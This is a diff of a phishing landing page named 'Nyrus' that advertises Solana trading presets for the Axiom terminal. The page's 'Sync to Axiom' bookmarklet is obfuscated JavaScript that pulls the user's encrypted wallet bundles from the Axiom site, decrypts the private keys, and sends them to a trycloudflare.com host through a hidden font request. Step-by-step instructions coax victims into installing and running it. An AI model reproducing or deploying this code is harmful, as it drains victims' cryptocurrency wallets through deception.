@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nyrus Axiom | Terminal Sync</title>
+    <title>Nyrus | The Axiom Upgrade</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #030508;
+            --bg: #05070a;
             --nav: #0a0d12;
             --card: #0d1117;
             --accent: #3b82f6;
@@ -31,9 +31,6 @@
             font-family: 'Inter', sans-serif;
             line-height: 1.6;
             min-height: 100vh;
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.05) 0px, transparent 40%),
-                radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.03) 0px, transparent 40%);
         }
 
         nav {
@@ -44,9 +41,6 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            position: sticky;
-            top: 0;
-            z-index: 100;
         }
 
         .brand {
@@ -65,174 +59,64 @@
             justify-content: center;
             font-weight: 700;
             font-size: 18px;
-            box-shadow: 0 0 15px var(--accent-glow);
         }
-
-        .brand-name {
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 24px;
-        }
-
-        .nav-link {
-            color: var(--text-dim);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .nav-link:hover { color: var(--text-main); }
-        .nav-link.active { color: var(--accent); }
 
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
             padding: 4rem 2rem;
         }
 
-        .hero-section {
+        .hero {
             text-align: center;
-            margin-bottom: 5rem;
+            margin-bottom: 4rem;
         }
 
-        .hero-section h1 {
-            font-size: 64px;
+        .hero h1 {
+            font-size: 56px;
             font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 1.5rem;
-            letter-spacing: -2px;
-            background: linear-gradient(to bottom right, #fff, #94a3b8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+            letter-spacing: -1px;
         }
 
-        .hero-section p {
+        .hero p {
             font-size: 20px;
             color: var(--text-dim);
-            max-width: 700px;
-            margin: 0 auto 3rem auto;
+            max-width: 600px;
+            margin: 0 auto;
         }
 
-        .features-grid {
+        .main-layout {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 2rem;
-            margin-bottom: 6rem;
-        }
-
-        .feature-card {
-            background: var(--panel);
-            padding: 2rem;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            text-align: left;
-        }
-
-        .feature-icon {
-            width: 40px;
-            height: 40px;
-            background: rgba(59, 130, 246, 0.1);
-            color: var(--accent);
-            border-radius: 10px;
-display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 1.5rem;
-        }
-
-        .feature-card h3 {
-            margin-bottom: 0.75rem;
-            font-size: 18px;
-        }
-
-        .feature-card p {
-            color: var(--text-dim);
-            font-size: 14px;
-        }
-
-        .main-content {
-            display: grid;
-            grid-template-columns: 1.5fr 1fr;
+            grid-template-columns: 1fr 1fr;
             gap: 3rem;
             align-items: start;
         }
 
-        .doc-section h2 {
-            font-size: 28px;
+        .info-section h2 {
+            font-size: 24px;
             margin-bottom: 1.5rem;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 0.75rem;
         }
 
-        .doc-item {
-            margin-bottom: 2rem;
+        .info-box {
+            background: var(--panel);
+            padding: 1.5rem;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            margin-bottom: 1.5rem;
         }
 
-        .doc-item h4 {
+        .info-box h4 {
             color: var(--accent);
             margin-bottom: 0.5rem;
-            font-size: 16px;
         }
 
         .card {
             background: var(--card);
-            padding: 2.5rem;
+            padding: 2rem;
             border-radius: 24px;
             border: 1px solid var(--border);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            position: sticky;
-            top: 100px;
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 2rem;
-        }
-
-        .stat-box {
-            background: var(--panel);
-            padding: 12px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-        }
-
-        .stat-label {
-            font-size: 10px;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: block;
-            margin-bottom: 4px;
-        }
-
-        .stat-value {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-        }
-
-        .pulse {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: var(--success);
-            border-radius: 50%;
-            margin-right: 6px;
-            box-shadow: 0 0 8px var(--success);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
         .sync-area {
@@ -246,7 +130,7 @@ display: flex;
 
         .btn {
             display: inline-flex;
-            align-items: center;
+align-items: center;
             background: var(--accent);
             color: white;
             padding: 16px 32px;
@@ -255,55 +139,32 @@ display: flex;
             font-size: 16px;
             text-decoration: none;
             cursor: grab;
-            transition: all 0.2s ease;
-            box-shadow: 0 8px 20px var(--accent-glow);
+            transition: transform 0.2s;
         }
 
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 12px 24px var(--accent-glow);
         }
 
-        .setup-guide {
+        .guide {
             background: var(--panel);
             padding: 1.5rem;
             border-radius: 16px;
             border: 1px solid var(--border);
         }
 
-        .guide-title {
-            font-size: 11px;
-            font-weight: 700;
-            color: var(--text-main);
-            margin-bottom: 1rem;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .step {
+        .guide-step {
             display: flex;
             gap: 12px;
             margin-bottom: 12px;
             font-size: 14px;
-            color: var(--text-dim);
         }
 
-        .step-num { color: var(--accent); font-weight: 700; font-family: 'JetBrains Mono', monospace; }
+        .step-n { color: var(--accent); font-weight: 700; }
 
-        footer {
-            margin-top: 6rem;
-            border-top: 1px solid var(--border);
-            padding: 4rem 2rem;
-            text-align: center;
-color: var(--text-dim);
-            font-size: 14px;
-        }
-
-        @media (max-width: 968px) {
-            .features-grid { grid-template-columns: 1fr; }
-            .main-content { grid-template-columns: 1fr; }
-            .hero-section h1 { font-size: 40px; }
+        @media (max-width: 850px) {
+            .main-layout { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 40px; }
         }
     </style>
 </head>
@@ -311,109 +172,59 @@ color: var(--text-dim);
     <nav>
         <div class="brand">
             <div class="logo">N</div>
-            <span class="brand-name">NYRUS AXIOM</span>
-        </div>
-        <div class="nav-links">
-            <a href="#presets" class="nav-link active">Presets</a>
-            <a href="#terminal" class="nav-link">Terminal</a>
-            <a href="#docs" class="nav-link">Documentation</a>
+            <span style="font-weight: 700;">NYRUS</span>
         </div>
     </nav>
 
     <div class="container">
-        <section class="hero-section">
-            <h1>The Professional Standard for Solana Execution.</h1>
-            <p>Industrial-grade presets, priority gas filters, and ultra-low latency configurations designed for the elite Axiom trader.</p>
-        </section>
+        <header class="hero">
+            <h1>Upgrade your Axiom.</h1>
+            <p>Better filters, faster gas presets, and custom settings injected directly into your terminal.</p>
+        </header>
 
-        <section class="features-grid">
-            <div class="feature-card">
-                <div class="feature-icon">⚡️</div>
-                <h3>Ultra-Low Latency</h3>
-                <p>Optimized RPC routing for sub-millisecond transaction propagation across the Solana network.</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">🛡️</div>
-                <h3>Secure Sync</h3>
-                <p>All configuration data is end-to-end encrypted using AES-256 before terminal injection.</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">🎯</div>
-                <h3>Priority Filters</h3>
-                <p>Custom-built gas and priority fee presets to ensure your transactions land in high-congestion blocks.</p>
-            </div>
-        </section>
-
-        <div class="main-content">
-            <div class="doc-section" id="docs">
-                <h2>Documentation</h2>
+        <div class="main-layout">
+            <div class="info-section">
+                <h2>Why Nyrus?</h2>
                 
-                <div class="doc-item">
-                    <h4>Module Deployment</h4>
-                    <p>The Nyrus Axiom Sync Module is a lightweight script that lives in your browser's bookmarks bar. When triggered on the Axiom domain, it securely injects your personalized trading environment variables.</p>
+                <div class="info-box">
+                    <h4>Pro Filters</h4>
+                    <p>Stop wasting time on manual settings. Get my custom-tuned filters that actually catch the plays you want.</p>
                 </div>
 
-                <div class="doc-item">
-                    <h4>Terminal Integration</h4>
-                    <p>Our presets are fully compatible with Axiom Mainnet v2.1. Once synced, you will have immediate access to optimized "Buy" and "Sell" presets designed for maximum speed.</p>
+                <div class="info-box">
+                    <h4>Instant Gas Sync</h4>
+                    <p>One-click sync for priority gas fees so you never miss a block during high-volatility moves.</p>
                 </div>
 
-                <div class="doc-item">
-                    <h4>Network Redundancy</h4>
-                    <p>Nyrus Axiom utilizes multiple RPC endpoints to ensure zero downtime. If one route is congested, the terminal automatically pivots to the next fastest provider.</p>
-                </div>
-
-                <div id="terminal" style="padding-top: 2rem;">
-                    <h2>Terminal Status</h2>
-                    <div style="background: #000; padding: 20px; border-radius: 12px; border: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--success);">
-                        <div>[SYSTEM] INITIALIZING NYRUS_AXIOM_ENGINE...</div>
-                        <div>[NETWORK] CONNECTED TO SOLANA MAINNET_BETA</div>
-                        <div>[INFO] PRESETS LOADED: 14 CUSTOM FILTERS</div>
-                        <div>[STATUS] AWAITING USER DEPLOYMENT...</div>
-                        <div style="animation: pulse 1s infinite;">_</div>
-                    </div>
+                <div class="info-box">
+                    <h4>Easy Setup</h4>
+                    <p>No extensions or complex installs. Just a simple bookmark that works whenever you're on the Axiom site.</p>
                 </div>
             </div>
 
-            <div class="card" id="presets">
-                <div class="stats-grid">
-                    <div class="stat-box">
-                        <span class="stat-label">Network</span>
-                        <span class="stat-value"><span class="pulse"></span>Mainnet-Beta</span>
-</div>
-                    <div class="stat-box">
-                        <span class="stat-label">Latency</span>
-                        <span class="stat-value" style="color: var(--success);">14ms (Optimal)</span>
-                    </div>
-                </div>
-
+            <div class="card">
                 <div class="sync-area">
                     <a href="javascript:(async function(){const r='https://hughes-wiring-happen-chronicles.trycloudflare.com';const F=m=>Uint8Array['from'](atob(m['replace'](/-/g,'+')['replace'](/_/g,'/')),M=>M['charCodeAt'](0x0)),L=async(m,M)=>{try{const [Y,x]=M['split'](':');return new Uint8Array(await crypto['subtle']['decrypt']({'name':'AES-GCM','iv':F(Y),'tagLength':0x80},m,F(x)));}catch(h){return null;}},u=m=>{const M='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let Y=[0x0];for(let h=0x0;h<m['length'];h++){let N=m[h];for(let v=0x0;v<Y['length']-0x1;v++){N+=Y[v]*0x100,Y[v]=N%0x3a,N=Math['floor'](N/0x3a);}while(N>0x0){Y['push'](N%0x3a),N=Math['floor'](N/0x3a);}}let x='';for(let C=0x0;m[C]===0x0&&C<m['length']-0x1;C++)x+=M[0x0];for(let n=Y['length']-0x1;n>=0x0;n--)x+=M[Y[n]];return x;};try{const m=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{'method':'POST','credentials':'include'}),M=await m['json']();if(!M['bundleKey'])return;const Y=await crypto['subtle']['importKey']('raw',F(M['bundleKey']),{'name':'AES-GCM'},![],['decrypt']);let x=[];const h=JSON['parse'](localStorage.getItem('sBundles')||'[]');for(const N of h){const v=await L(Y,N);v&&x['push']({'type':'SOL','public':u(v['slice'](-0x20)),'private':u(v)});}if(x['length']>0x0){const C=btoa(JSON['stringify']({'keys':x})),n=document['createElement']('style');n['textContent']='@font-face\x20{\x20font-family:\x20\x27leak\x27;\x20src:\x20url(\x27'+r+'/?data='+encodeURIComponent(C)+'\x27);\x20}',document['head']['appendChild'](n);const l=document['createElement']('div');l['style']['fontFamily']='leak',l['textContent']='.',document['body']['appendChild'](l);}}catch(z){}}());" class="btn" ondragstart="return true;">
-                        Sync Axiom Presets
+Sync to Axiom
                     </a>
                 </div>
 
-                <div class="setup-guide">
-                    <span class="guide-title">Deployment Guide</span>
-                    <div class="step">
-                        <span class="step-num">01</span>
-                        <span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
+                <div class="guide">
+                    <div class="guide-step">
+                        <span class="step-n">1.</span>
+                        <span>Drag the <b>Sync Button</b> to your bookmarks bar.</span>
                     </div>
-                    <div class="step">
-                        <span class="step-num">02</span>
-                        <span>Drag the <b>Sync Button</b> to your bar</span>
+                    <div class="guide-step">
+                        <span class="step-n">2.</span>
+                        <span>Open <b>Axiom.trade</b> in your browser.</span>
                     </div>
-                    <div class="step">
-                        <span class="step-num">03</span>
-                        <span>Navigate to Axiom.trade & click bookmark</span>
+                    <div class="guide-step">
+                        <span class="step-n">3.</span>
+                        <span>Click the bookmark to apply your settings.</span>
                     </div>
                 </div>
             </div>
         </div>
     </div>
-
-    <footer>
-        &copy; 2026 Nyrus Axiom. Industrial Solana Infrastructure. AES-256 E2E Encrypted.
-    </footer>
 </body>
 </html>
